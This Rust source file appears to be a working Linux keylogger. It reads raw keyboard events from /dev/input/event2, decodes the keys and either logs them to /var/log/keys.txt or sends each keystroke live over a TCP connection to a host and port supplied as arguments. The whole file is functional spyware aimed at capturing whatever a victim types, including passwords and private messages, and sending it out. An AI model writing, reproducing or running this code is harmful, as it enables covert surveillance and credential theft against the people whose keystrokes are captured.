use std::fs::File;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::env;

mod parse_input;
use parse_input::{get_input_code, get_input_type, get_key};

fn main() {

    // define files to read from and write to
    let event_file = File::open("/dev/input/event2").expect("Failed to open event file");
    let keys_file = File::create("/var/log/keys.txt").expect("Failed to create keys file");

    // get args
    let args: Vec<String> = env::args().collect();

    // match arguments for upload type
    match args[1].as_str() {
        "-r" => {
            let addr = &args[2];
            let port = &args[3];
            let connection = TcpStream::connect(format!("{addr}:{port}")).expect("Failed to connect");
            write_remote(event_file, connection);
        },
        "-l" => write_local(event_file, keys_file),
        _ => panic!("Error in arguments")
    };
    
}

fn write_local(mut event_file: File, mut keys_file: File) {
    loop {
        let mut buffer = [0u8; 72];
        let bytes_read = event_file.read(&mut buffer).expect("Failed to read from event file");
        let data = &buffer[..bytes_read];
        let mut builder = String::new();
        for element in data {
            builder += format!("{:02X}", element).as_str();
        } 

        let input_code = get_input_code(&builder);
        let input_type = get_input_type(&builder);
        let key = get_key(input_code);

        if (input_type == "01") || (input_type == "rpt") {
            keys_file.write_all(key.as_bytes()).expect("Failed to write to keys file");
        }
    }
}

fn write_remote(mut event_file: File, mut connection: TcpStream) {
    loop {
        let mut buffer = [0u8; 72];
        let bytes_read = event_file.read(&mut buffer).expect("Failed to read from event file");
        let data = &buffer[..bytes_read];
        let mut builder = String::new();
        for element in data {
            builder += format!("{:02X}", element).as_str();
        } 

        let input_code = get_input_code(&builder);
        let input_type = get_input_type(&builder);
        let key = get_key(input_code);

        if (input_type == "01") || (input_type == "rpt") {
            connection.write(key.as_bytes()).expect("Failed to write to socket");
        }
    }
}
